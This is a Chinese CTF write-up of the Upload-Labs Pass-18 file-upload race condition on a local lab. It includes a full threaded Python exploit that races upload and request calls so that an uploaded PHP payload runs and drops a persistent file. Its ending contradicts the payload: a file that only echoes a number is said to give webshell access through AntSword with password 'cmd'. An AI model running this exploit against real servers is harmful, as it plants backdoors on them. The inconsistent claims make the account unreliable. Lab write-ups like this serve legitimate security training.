【Upload-Labs】Pass-18 条件竞争 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, 条件竞争, Python脚本, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-18 (条件竞争)
  • 提示：服务端先保存文件，后校验后缀，存在极短的时间窗口。

2. 核心原理与前置分析

条件竞争（Race Condition）：源码逻辑为先将上传的临时文件通过 move_uploaded_file() 移动到目标目录，随后才通过 in_array() 检查文件后缀。如果后缀不合法，立刻通过 unlink() 删除该文件。

在“文件落地”与“文件被删除”之间存在极其短暂的时间差。通过编写多线程脚本，一边高频发送上传请求（POST），一边高频发送访问请求（GET）。一旦在窗口期成功访问到该文件，其中的 Payload 就会被执行。Payload 设计为自动生成一个纯净的持久化后门（p18_win.php），从而绕过删除机制。

3. 脚本代码与结构解析

使用 Python 标准库编写并发脚本 race18.py，完整代码如下：

import http.client, threading, time

HOST, PORT = "127.0.0.1", 8081
UPLOAD_PATH = "/Pass-18/index.php"
TARGET = "/upload/claude18.php"
BOUNDARY = "----race18"
PAYLOAD = b"<?php file_put_contents(__DIR__.'/p18_win.php','<?php echo 481516;?>');echo 481517; ?>"

def upload():
    body = (
        ("--%s\r\n" % BOUNDARY).encode()
        + b'Content-Disposition: form-data; name="upload_file"; filename="claude18.php"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\n"
        + PAYLOAD + b"\r\n"
        + ("--%s\r\n" % BOUNDARY).encode()
        + b'Content-Disposition: form-data; name="submit"\r\n\r\nupload\r\n'
        + ("--%s--\r\n" % BOUNDARY).encode()
    )
    try:
        c = http.client.HTTPConnection(HOST, PORT, timeout=5)
        c.request("POST", UPLOAD_PATH, body, {
            "Content-Type": "multipart/form-data; boundary=%s" % BOUNDARY,
            "Content-Length": str(len(body)),
        })
        c.getresponse().read()
        c.close()
    except Exception:
        pass

def getter(stop, hits):
    while not stop.is_set():
        try:
            c = http.client.HTTPConnection(HOST, PORT, timeout=2)
            c.request("GET", TARGET)
            data = c.getresponse().read()
            c.close()
            if b"481517" in data:
                hits.append(1)
                stop.set()
        except Exception:
            pass

stop = threading.Event()
hits = []
threads = [threading.Thread(target=getter, args=(stop, hits), daemon=True) for _ in range(10)]
for t in threads:
    t.start()

start = time.time()
n = 0
while time.time() - start < 45 and not stop.is_set():
    upload()
    n += 1
    if n % 50 == 0:
        print("uploads:", n, "hits:", len(hits), flush=True)

time.sleep(1)
print("uploads total:", n, "hits:", len(hits))
try:
    c = http.client.HTTPConnection(HOST, PORT, timeout=3)
    c.request("GET", "/upload/p18_win.php")
    d = c.getresponse().read()
    c.close()
    print("persistent:", b"481516" in d)
except Exception as e:
    print("persistent check error:", e)

核心代码结构解析：

  • Payload 设计：file_put_contents(__DIR__.'/p18_win.php', ...) 这一句是灵魂。__DIR__ 代表当前文件所在目录。只要木马执行一次，它就会生成一个名为 p18_win.php 的纯净文件。这个新文件不会被检查，所以能永久存活。
  • upload() 函数：负责构造 HTTP POST 请求。通过手动拼接 multipart/form-data 的边界（Boundary），将包含 Payload 的 claude18.php 发送给服务器。
  • getter() 函数：这是并发访问的“小偷”。while not stop.is_set(): 让它在收到停止信号前一直死循环。不断向 TARGET 发起 GET 请求，如果收到的数据里包含 481517（证明马被成功执行了），就触发 stop.set() 结束战斗。
  • 多线程执行：利用 threading.Thread 开启了 10 个 getter 线程。主线程则在 45 秒的时间限制内疯狂调用 upload()。这种高并发极大地提高了命中时间窗口的概率。

说明在 82 次上传中，有 10 次成功命中了窗口，且成功生成了持久化后门。

第二步：验证与连接

浏览器访问 http://127.0.0.1:8081/upload/p18_win.php，输出 481516。使用蚁剑连接该地址，密码 cmd，成功获取服务器权限。

5. 踩坑记录与复盘

  • Python 脚本的威力：条件竞争漏洞依靠手工点击是完全无法利用的，必须借助脚本的并发能力。利用 VS Code 编写和调试 Python 脚本，能够直观地看到上传次数和命中结果。
  • 持久化思维：在竞争文件中不要直接写常规的后门代码，因为文件随时会被删除。写入“生成另一个文件”的代码，是条件竞争利用的标配操作。

6. 知识点总结

  • 条件竞争漏洞：利用服务端代码执行逻辑的先后顺序缺陷，在中间的时间间隙完成恶意操作。
  • 多线程并发脚本：掌握利用 Python 的 threading 和 http.client 模块进行高频发包，是漏洞利用自动化的必经之路。
